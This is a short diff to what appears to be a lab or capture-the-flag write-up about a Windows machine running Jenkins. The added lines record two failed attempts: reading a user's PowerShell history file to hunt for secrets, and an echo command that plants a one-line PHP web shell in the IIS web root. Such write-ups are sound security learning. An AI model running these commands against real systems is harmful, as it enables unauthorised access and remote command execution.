@@ -121,6 +121,20 @@ FileName                              %systemroot%\system32\LogFiles\Firewall\pf
 MaxFileSize                           4096
 ```
 
+Trying several other things like reading oliver's powershell history:
+
+```
+type C:\Users\oliver\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+Or writing we web shell to wwwroot:
+
+```
+echo '<?php SYSTEM($_REQUEST['cmd']); ?>' >> "C:\inetpub\wwwroot\cmd.php"
+```
+
+all failed.
+
 ### Foothold 
 
 We can view Jenkins files:
